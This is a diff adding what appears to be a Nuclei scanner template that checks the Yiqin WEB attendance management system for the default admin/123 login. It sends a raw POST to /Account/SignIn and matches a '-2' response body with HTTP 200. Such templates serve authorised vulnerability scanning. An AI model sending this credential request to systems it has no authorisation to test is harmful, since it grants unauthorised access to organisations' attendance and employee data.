@@ -1,0 +1,36 @@
+id: login-default-yiqin
+
+info:
+  name: login-default-yiqin
+  author: capiton
+  severity: high
+  description: 北京易勤信息技术有限公司-易勤WEB考勤管理系统
+  reference:
+    - https://
+  tags: yiqin
+
+requests:
+  - raw:
+      - |-
+        POST /Account/SignIn HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 62
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: Language=Chinese
+
+
+        { loginName : 'admin',password : '123',isRemember:'undefined'}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '-2'
+      - type: status
+        status:
+          - 200
